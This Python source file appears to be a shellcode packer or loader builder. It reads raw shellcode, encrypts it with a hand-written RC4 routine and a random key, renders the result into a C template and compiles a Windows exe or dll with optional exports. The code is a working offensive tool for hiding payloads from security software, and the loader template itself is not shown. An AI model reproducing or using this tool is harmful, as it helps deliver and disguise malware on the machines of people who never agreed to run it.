import os
import jinja2
import click
import traceback
import subprocess
import secrets

from typing import Iterator
from base64 import b64encode

def key_scheduling(key: bytes) -> list:
	sched = [i for i in range(0, 256)]

	i = 0
	for j in range(0, 256):
		i = (i + sched[j] + key[j % len(key)]) % 256
		tmp = sched[j]
		sched[j] = sched[i]
		sched[i] = tmp

	return sched


def stream_generation(sched: list[int]) -> Iterator[bytes]:
	i, j = 0, 0
	while True:
		i = (1 + i) % 256
		j = (sched[i] + j) % 256
		tmp = sched[j]
		sched[j] = sched[i]
		sched[i] = tmp
		yield sched[(sched[i] + sched[j]) % 256]        


def encrypt(plaintext: bytes, key: bytes) -> bytes:
	sched = key_scheduling(key)
	key_stream = stream_generation(sched)
	
	ciphertext = b''
	for char in plaintext:
		enc = char ^ next(key_stream)
		ciphertext += bytes([enc])
		
	return ciphertext

def xxd(data):
	return ','.join('0x{:02x}'.format(i) for i in data)
		

@click.command()
@click.option('--bin', '-b', type=click.Path(exists=True), help='Path to a file with raw shellcode')
@click.option('--arch', '-a', type=click.Choice(['x86', 'x64']), default=None, help='Build architechture')
@click.option('--type', '-t', type=click.Choice(['exe', 'dll']), help='Executable type')
@click.option('--exports', '-e', multiple=True, help='Dll exports')
def cli(bin, arch, type, exports):
	try:
		with open(bin, 'rb') as f:
			bin_data = f.read()

		key = secrets.token_bytes(16)
		key_len = len(key)
		enc_bin_data = encrypt(bin_data, key)
		enc_bin_data_len = len(enc_bin_data)

		config = {
			'bin': xxd(enc_bin_data),
			'bin_size': enc_bin_data_len,
			'key': xxd(key),
			'key_size': key_len,
		}
			
		if type == 'dll':
			config['dll'] = {}
			if len(exports) > 0:
				config['dll']['exports'] = exports
		elif type == 'exe':
			config['exe'] = True

		script_path = os.path.dirname(os.path.realpath(__file__))
		tldr = jinja2.FileSystemLoader(searchpath=script_path)
		tenv = jinja2.Environment(loader=tldr)
		template = tenv.get_template('main.template')
		with open(os.path.join(script_path, 'main.c'), 'w') as f:
			f.write(template.render(config=config))

		if arch is not None:
			make_cmd = 'make ARCH={0} TARGET={1}'.format(arch, type)
			subprocess.run(make_cmd, shell=True)
		
	except Exception as e:
		print("[!] Error: ", e)
		print(traceback.format_exc())


if __name__ == '__main__':
	cli()